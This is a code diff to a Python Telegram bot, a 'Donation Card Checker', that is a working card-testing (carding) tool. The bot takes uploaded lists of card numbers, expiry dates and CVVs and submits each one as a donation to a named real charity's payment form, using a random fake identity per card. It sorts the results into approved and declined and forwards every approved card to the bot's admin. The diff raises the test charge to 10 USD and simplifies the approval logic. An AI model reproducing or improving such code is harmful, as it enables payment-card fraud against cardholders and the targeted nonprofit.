@@ -1,6 +1,11 @@
 #!/usr/bin/env python3
 """
-Donation Card Checker — Multi-User Telegram Bot (full, unmasked results)
+Donation Card Checker — Multi-User Telegram Bot
+- Uses the exact standalone logic for classification
+- Random realistic identity per card
+- Accepts .txt/.csv (number|mm|yy|cvv)
+- Each user sees their own results
+- Admin (TELEGRAM_CHAT_ID) gets every APPROVED from every user
 """
 import os
 import sys
@@ -35,7 +40,7 @@ os.makedirs(BASE_OUTPUT_DIR, exist_ok=True)
 
 DEFAULT_SITE_URL = os.getenv("DEFAULT_SITE_URL", "https://reachsoberliving.org")
 DEFAULT_FORM_ID = os.getenv("DEFAULT_FORM_ID", "347")
-DEFAULT_AMOUNT = os.getenv("DEFAULT_AMOUNT", "1.50")
+DEFAULT_AMOUNT = os.getenv("DEFAULT_AMOUNT", "10.00")
 DEFAULT_CURRENCY = os.getenv("DEFAULT_CURRENCY", "USD")
 DEFAULT_M_NAME = os.getenv("DEFAULT_M_NAME", "7zJ2Ef75sqgw")
 DEFAULT_CLIENT_KEY = os.getenv(
@@ -294,24 +299,53 @@ def donate(session_cfg, card_number, card_exp_mmyy, card_cvv):
 
 
 def extract_error(result):
+    """Exact standalone logic: gateway_error first, else raw body."""
+    resp = result.get("response") or {}
+    if not isinstance(resp, dict):
+        resp = {}
+
+    # 1) gateway_error — the real bank message
     try:
-        msg = result["response"]["data"]["errors"]["errors"]["gateway_error"][0]
+        msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
         msg = msg.split("] ", 1)[-1] if "] " in msg else msg
         return msg
     except (KeyError, IndexError, TypeError):
         pass
-    try:
-        errs = result["response"].get("errors")
-        if isinstance(errs, list) and errs:
-            e = errs[0]
-            if isinstance(e, dict):
-                return e.get("message") or json.dumps(e)[:200]
-            return str(e)[:200]
-    except Exception:
-        pass
+
+    # 2) fallback: raw body
     if result.get("raw"):
-        return result["raw"][:200]
+        return result["raw"][:300]
+
     return "Unknown error"
+
+
+def classify(result):
+    """Exact standalone logic:
+       1) gateway_error present → parse approved/declined from message
+       2) else → success boolean
+       3) else → declined
+    """
+    resp = result.get("response") or {}
+    if not isinstance(resp, dict):
+        resp = {}
+
+    # Case 1: gateway_error present
+    try:
+        raw_msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
+        msg = raw_msg.split("] ", 1)[-1] if "] " in raw_msg else raw_msg
+        ml = msg.lower()
+        if "approved" in ml or "successful" in ml or "thank you" in ml:
+            return "APPROVED"
+        return "DECLINED"
+    except (KeyError, IndexError, TypeError):
+        pass
+
+    # Case 2: success boolean — real approval only when ok AND success==true
+    if result.get("ok") and resp.get("success") is True:
+        return "APPROVED"
+
+    # Case 3: everything else = declined
+    return "DECLINED"
 
 
 def parse_card_line(line):
@@ -336,45 +370,6 @@ def parse_card_line(line):
     if len(cc_num) < 13 or not mm or not yy or not cvv:
         return None
     return {"raw": f"{cc_num}|{mm}|{yy}|{cvv}", "num": cc_num, "mm": mm, "yy": yy, "cvv": cvv}
-
-
-def classify(result):
-    """Mirror standalone: APPROVED only when body says so."""
-    if result.get("stage") == "tokenize":
-        return "DECLINED"
-
-    resp = result.get("response") or {}
-    if not isinstance(resp, dict):
-        resp = {}
-
-    if resp.get("success") is True:
-        data = resp.get("data")
-        errs = data.get("errors") if isinstance(data, dict) else None
-        if not errs:
-            return "APPROVED"
-
-    msg = extract_error(result).lower()
-
-    if any(k in msg for k in (
-        "approved", "success", "thank you",
-        "transaction was successful", "this transaction has been approved"
-    )):
-        return "APPROVED"
-
-    if any(k in msg for k in (
-        "insufficient", "declined", "do not honor", "pick up",
-        "expired", "invalid cvv", "cvv", "lost card", "stolen",
-        "invalid card number", "card number is invalid",
-        "invalid expiration", "no such card", "not recognized",
-        "invalid credit card", "card not supported",
-        "duplicate", "duplicate window"
-    )):
-        return "DECLINED"
-
-    if "invalid" in msg or "error" in msg:
-        return "DECLINED"
-
-    return "UNKNOWN"
 
 
 def check_card_worker(session_cfg, card):
@@ -504,7 +499,7 @@ def process_one(session, card, loop, bot):
         f"📧 <code>{ident.get('email','-')}</code>\n"
         f"📱 {ident.get('phone','-')}\n"
         f"<b>stage:</b> {r.get('raw_stage','?')} | <b>http:</b> {r.get('http_status','?')}\n"
-        f"<i>{r['message'][:200]}</i>"
+        f"<i>{r['message'][:300]}</i>"
     )
     asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, user_msg), loop)
 
@@ -594,7 +589,6 @@ def kb_results():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("✅ Approved", callback_data="res_approved")],
         [InlineKeyboardButton("❌ Declined", callback_data="res_declined")],
-        [InlineKeyboardButton("❓ Unknown", callback_data="res_unknown")],
         [InlineKeyboardButton("⚠️ Errors", callback_data="res_errors")],
         [InlineKeyboardButton("📦 Send All Files", callback_data="res_all")],
         [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
@@ -619,7 +613,6 @@ def stats_text(session):
         f"💳 Total: <b>{session.total}</b> | 🔁 Done: <b>{session.processed}</b>\n"
         f"✅ Approved: <b>{session.approved}</b>\n"
         f"❌ Declined: <b>{session.declined}</b>\n"
-        f"❓ Unknown: <b>{session.unknown}</b>\n"
         f"⚠️ Errors: <b>{session.errors}</b>\n"
         f"⏳ Elapsed: <b>{elapsed}s</b>"
     )
@@ -658,7 +651,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "2️⃣ Upload <code>.txt</code> (one per line: <code>num|mm|yy|cvv</code>)\n"
         "3️⃣ Bot confirms\n"
         "4️⃣ Press <b>▶️ Start Check</b>\n"
-        "5️⃣ Watch results stream live\n\n"
+        "5️⃣ Watch real results stream live\n\n"
         "<i>Each card gets a fresh random identity automatically.</i>",
         parse_mode=ParseMode.HTML,
         reply_markup=kb_main(session)
@@ -854,7 +847,6 @@ async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 sent = 0
                 for name, cap in [("approved.txt", "Approved"),
                                   ("declined.txt", "Declined"),
-                                  ("unknown.txt", "Unknown"),
                                   ("errors.txt", "Errors")]:
                     p = session.file(name)
                     if os.path.exists(p) and os.path.getsize(p) > 0:
@@ -917,7 +909,8 @@ async def run_check(app: Application, session: UserSession):
         f"<b>🚀 Started</b>\n"
         f"Cards: {session.total}\n"
         f"Threads: {session.threads}\n"
-        f"Site: <code>{session.cfg['site_url']}</code>",
+        f"Site: <code>{session.cfg['site_url']}</code>\n"
+        f"Amount: {session.cfg['amount']} {session.cfg['currency']}",
         parse_mode=ParseMode.HTML)
 
     async def progress_loop():
@@ -952,8 +945,6 @@ async def run_check(app: Application, session: UserSession):
             f.write(" | ".join(str(x) for x in row) + "\n")
     with open(session.file("declined.txt"), "w", encoding="utf-8") as f:
         f.write(f"Declined count: {session.declined}\n")
-    with open(session.file("unknown.txt"), "w", encoding="utf-8") as f:
-        f.write(f"Unknown count: {session.unknown}\n")
     with open(session.file("errors.txt"), "w", encoding="utf-8") as f:
         f.write(f"Errors count: {session.errors}\n")
 
